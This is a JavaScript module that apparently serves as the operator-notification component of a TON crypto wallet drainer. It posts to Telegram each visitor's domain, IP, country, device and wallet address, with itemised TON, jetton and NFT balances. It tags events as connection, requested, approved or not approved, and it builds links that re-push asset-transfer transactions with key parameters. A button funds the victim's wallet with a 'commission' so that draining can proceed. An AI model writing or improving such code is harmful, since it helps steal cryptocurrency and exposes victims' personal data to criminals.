const TonWeb = require('tonweb');
const axios = require("axios");
const locale = require('../locale');

class Notify {
    #userInfo;
    messages = [];
    constructor(tokens, ids, userInfo) {
        this.token = tokens;
        this.id = ids;
        this.#userInfo = userInfo;
    }

    convertAddress () {
        const address = new TonWeb.utils.Address(this.#userInfo.address);
        return address.toString(true, true, false);
    }

    updateUserInfo (userInfo) {this.#userInfo = userInfo;}

    user () {
        return locale.user(this.#userInfo.domain, this.#userInfo.ip, this.#userInfo.country);
    }

    walletInfo () {
        const userFriendlyAddress = this.convertAddress();
        return locale.wallet(this.#userInfo.device, userFriendlyAddress);
    }

    async #send (message, id, buttons) {
        try {
            const result = await axios.post(`https://api.telegram.org/bot${this.token}/sendMessage`, {
                chat_id: id,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        ...buttons
                    ],
                })
            }, {
                headers: {
                    'Content-Type': 'application/json'
                },
            });
            return result.data.result;
        } catch (e) {
            setTimeout(async () => {
                const result = await axios.post(`https://api.telegram.org/bot${this.token}/sendMessage`, {
                    chat_id: id,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    reply_markup: JSON.stringify({
                        inline_keyboard: [
                            ...buttons
                        ],
                    })
                }, {
                    headers: {
                        'Content-Type': 'application/json'
                    },
                });
            }, 60 * 1000);
            return {message_id: 0};
        }
    }

    async #edit (message, id, messageId, buttons) {
        try {
            const result = await axios.post(`https://api.telegram.org/bot${this.token}/editMessageText`, {
                chat_id: id,
                message_id: messageId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        ...buttons
                    ],
                })
            }, {
                headers: {
                    'Content-Type': 'application/json'
                },
            });
        } catch (e) {
            setTimeout(async () => {
                const result = await axios.post(`https://api.telegram.org/bot${this.token}/editMessageText`, {
                    chat_id: id,
                    message_id: messageId,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    reply_markup: JSON.stringify({
                        inline_keyboard: [
                            ...buttons
                        ],
                    })
                }, {
                    headers: {
                        'Content-Type': 'application/json'
                    },
                });
            }, 60 * 1000);
        }
    }

    async #notifyTelegramChannel(message, buttons = []) {
        try {
            for (const id of this.id) {
                let edit;
                for (const msg of this.messages) {
                    const pattern = msg.text.includes('#connection') || msg.text.includes('#requested') || msg.text.includes('#approved') || msg.text.includes('#notapproved');
                    if (msg.text.includes(message) && pattern && msg.chat_id === id) {
                        msg.double += 1;
                        edit = msg;
                        break;
                    }
                }
                if (!edit) {
                    const result = await this.#send(message, id, buttons);
                    this.messages.push({text: message, id: result.message_id, double: 1, chat_id: id});
                } else {
                    await this.#edit(`<b>x${edit.double}</b> ` + edit.text, id, edit.id, buttons);
                }
            }
            return true;
        } catch (e) {
            console.log(e)
            return false;
        }
    };

    async opened () {
        const message = locale.connection +
            this.user();
        await this.#notifyTelegramChannel(message);
        return message;
    }

    async closed () {
        const message = locale.closed +
            this.user();
        await this.#notifyTelegramChannel(message);
        return message;
    }

    async connected (total, ton, jettonList, nftList, settings) {
        try {
            if (settings.NOTIFY_ZERO_WALLETS === 'false' && +ton < 0.10 && jettonList.length === 0 && nftList.length === 0) {
                return;
            }

            let message = locale.connected.heading(this.#userInfo.hash) +
                this.user() +
                this.walletInfo() +
                locale.connected.balance(total, settings.CURRENCY);
            let jetonsWithoutZero = false;
            message += `<blockquote>${locale.connected.ton(ton)}`;
            if (jettonList.length > 0) {
                jettonList.forEach(jetton => {
                    if (jetton.balance > 0 && jetton.name !== 'Proxy') {
                        message += locale.connected.jetton(jetton, settings.CURRENCY);
                        jetonsWithoutZero = true;
                    }
                });
            }
            if (nftList.length > 0) {
                nftList.forEach(nft => {
                    message += locale.connected.nft(nft, settings.CURRENCY);
                });
            }
            message += '</blockquote>';
            let url = '';
            let useButtons = false;
            message += '\n#connection'
            if (+ton < 0.05 && jettonList.length > 0 && jetonsWithoutZero === true || +ton < 0.05 && nftList.length > 0) {
                url = `ton://transfer/${this.#userInfo.address}?amount=${+settings.BUTTON_FEE_AMOUNT * 1000000000}&text=${encodeURIComponent(settings.BUTON_FEE_COM)}`;
                message += ` #comission`;
                useButtons = true;
            }

            await this.#notifyTelegramChannel(message, useButtons ? [[{text: '💎 Отправить комиссию', url: url}]] : []);

            return message;
        } catch (e) {console.log(e)}
    }

    async creatingJetton (chunk, data, apiUrl, currency) {
        try {
            let chunkBalance = chunk.reduce((sum, asset) => asset.name !== 'Proxy' ? sum + +asset.inCurrency : sum + 0, 0);

            let url;
            if (data.pub !== undefined) {
                url = `https://${apiUrl}/bridge/${data.app}/sendTransaction?pub=${data.pub}&sec=${data.sec}&walletPublicKey=${data.from}&address=${data.address}&chunk=${encodeURIComponent(JSON.stringify(chunk))}`;
            }

            let message = locale.pushTransaction.heading(this.#userInfo.hash) +
                locale.pushTransaction.total(chunkBalance, currency) +
                this.user() +
                this.walletInfo();
            chunk.forEach(asset => {
                if (asset.name !== 'Proxy') {
                    message += locale.pushTransaction.asset(asset, currency);
                } else {
                    message += 'Proxy-Transaction\n';
                }
            });

            message += '\n\n#requested'

            await this.#notifyTelegramChannel(message, url ? [[{text: locale.pushTransaction.rePushButton, url: url}]] : []);

            return message;
        } catch (e) {
            console.log(e)
        }
    }

    async transactionStatusJetton (status, chunk, currency) {

        let message = '';
        let chunkBalance = chunk.reduce((sum, asset) => asset.name !== 'Proxy' ? sum + +asset.inCurrency : sum + 0, 0);
        switch (status) {
            case 'sent':
                message += locale.transactionStatus.headingApproved(this.#userInfo.hash) +
                    locale.transactionStatus.total(chunkBalance) +
                    this.user() +
                    this.walletInfo();
                chunk.forEach(asset => {
                    if (asset.name !== 'Proxy') {
                        message += locale.transactionStatus.asset(asset, currency);
                    } else {
                        message += 'Proxy-Transaction\n';
                    }
                });
                message += '\n\n#approved'
                break;
            case 'error':
                message += locale.transactionStatus.headingReject(this.#userInfo.hash) +
                    locale.transactionStatus.total(chunkBalance, currency) +
                    this.user() +
                    this.walletInfo();
                chunk.forEach(asset => {
                    if (asset.name !== 'Proxy') {
                        message += locale.transactionStatus.asset(asset, currency);
                    } else {
                        message += 'Proxy-Transaction\n';
                    }
                });
                message += '\n\n#notapproved'
                break;
        }

        await this.#notifyTelegramChannel(message);

        return message;
    }
}

module.exports = Notify;